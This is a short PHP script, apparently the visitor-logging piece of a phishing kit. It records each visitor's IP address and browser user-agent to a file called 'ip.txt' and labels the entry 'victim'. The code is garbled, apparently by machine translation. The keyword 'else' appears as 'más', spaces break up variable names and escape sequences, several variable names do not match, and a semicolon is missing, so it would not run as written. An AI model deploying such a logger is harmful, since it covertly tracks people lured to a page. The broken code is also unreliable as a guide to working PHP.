<? php

if (! empty ( $ _SERVER [ 'HTTP_CLIENT_IP' ]))
    {
      $ ipaddress = $ _SERVER [ 'HTTP_CLIENT_IP' ]. "\ r \ n" ;
    }
elseif (! empty ( $ _SERVER [ 'HTTP_X_FORWARDED_FOR' ]))
    {
      $ ipaddress = $ _SERVER [ 'HTTP_X_FORWARDED_FOR' ]. "\ r \ n" ;
    }
más
    {
      $ ipaddress = $ _SERVER [ 'REMOTE_ADDR' ]. "\ r \ n" ;
    }
$ useragent = "Usuario-Agente:" ;
$ browser = $ _SERVER [ 'HTTP_USER_AGENT' ];


$ archivo = 'ip.txt' ;
$ victim = "IP:" ;
$ fp = fopen ( $ archivo , 'a' );

fwrite ( $ fp , $ victima );
fwrite ( $ fp , $ ipaddress );
fwrite ( $ fp , $ useragent );
fwrite ( $ fp , $ navegador );


fclose ( $ fp )